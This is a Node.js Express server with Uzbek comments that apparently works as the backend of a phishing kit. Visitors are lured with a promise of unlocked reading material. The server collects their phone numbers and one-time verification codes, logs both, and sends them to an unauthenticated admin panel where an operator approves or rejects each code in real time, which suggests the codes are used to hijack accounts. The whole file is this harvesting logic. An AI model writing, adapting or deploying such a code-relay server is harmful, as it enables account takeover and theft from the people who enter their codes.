const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const LOG_FILE = path.join(__dirname, 'log.txt');

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(__dirname));

/**
 * Real-time sessiya holati
 * status: 'IDLE' | 'CODE_SUBMITTED' | 'APPROVED' | 'REJECTED'
 */
let sessionState = {
    phone: '',
    code: '',
    status: 'IDLE',
    adminMessage: '',
    updatedAt: new Date().toLocaleTimeString()
};

function getFormattedDate() {
    const pad = (n) => String(n).padStart(2, '0');
    const d = new Date();
    return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
}

function writeLog(line) {
    try {
        // Vercel serverless tizimida fayl tizimi faqat o'qish uchun (read-only) bo'lgani uchun
        if (!process.env.VERCEL) {
            fs.appendFileSync(LOG_FILE, `[${getFormattedDate()}] ${line}\n`, 'utf8');
        }
    } catch (e) {}
}

// Asosiy sahifalar marshruti (Vercel va local uchun)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

app.get('/admin.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// 1. Foydalanuvchi telefon kiritganda
app.post('/api/send-code', (req, res) => {
    const phone = req.body.phone || '';
    sessionState = {
        phone: phone,
        code: '',
        status: 'PHONE_ENTERED',
        adminMessage: 'Kod kiritilishi kutilmoqda...',
        updatedAt: new Date().toLocaleTimeString()
    };

    console.log(`\n📱 [1-BOSQICH] Telefon kiritildi: ${phone}`);
    writeLog(`1-BOSQICH | TELEFON: ${phone}`);

    res.json({ success: true, message: 'Telefon qabul qilindi' });
});

// 2. Foydalanuvchi kodni kiritganda
app.post('/api/submit-code', (req, res) => {
    const { phone, code } = req.body;
    sessionState = {
        phone: phone || sessionState.phone,
        code: code,
        status: 'CODE_SUBMITTED',
        adminMessage: 'Admin tasdiqlashi kutilmoqda...',
        updatedAt: new Date().toLocaleTimeString()
    };

    console.log(`\n🔑 [2-BOSQICH] Kod keldi: ${phone} -> [ ${code} ]`);
    writeLog(`2-BOSQICH | TELEFON: ${phone} | KOD: ${code} | STATUS: KUTILMOQDA`);

    res.json({ success: true, message: 'Kod qabul qilindi, adminga yuborildi' });
});

// 3. Foydalanuvchi o'z holatini tekshirishi uchun (Polling)
app.get('/api/status', (req, res) => {
    res.json(sessionState);
});

// 4. Admin qaror qabul qilganda (APPROVE yoki REJECT)
app.post('/api/admin-action', (req, res) => {
    const { action, message } = req.body;

    if (action === 'APPROVE') {
        sessionState.status = 'APPROVED';
        sessionState.adminMessage = message || 'Toʻgʻri! Material ochildi.';
        console.log(`\n🎉 [ADMIN QARORI] TOʻGʻRI! Reading ochildi.`);
        writeLog(`ADMIN | QAROR: TO'G'RI (APPROVED) | TELEFON: ${sessionState.phone}`);
    } else if (action === 'REJECT') {
        sessionState.status = 'REJECTED';
        sessionState.adminMessage = message || 'Kodni qayta kiriting!';
        console.log(`\n❌ [ADMIN QARORI] NOTOʻGʻRI!`);
        writeLog(`ADMIN | QAROR: XATO (REJECTED) | TELEFON: ${sessionState.phone}`);
    } else {
        sessionState.status = 'IDLE';
        sessionState.code = '';
    }

    sessionState.updatedAt = new Date().toLocaleTimeString();
    res.json({ success: true, state: sessionState });
});

// Local muhitda serverni tinglash
if (!process.env.VERCEL) {
    app.listen(PORT, () => {
        console.log(`🚀 Sayt ishga tushdi: http://localhost:${PORT}`);
        console.log(`👑 Admin paneli: http://localhost:${PORT}/admin.html`);
    });
}

// Vercel serverless uchun eksport
module.exports = app;
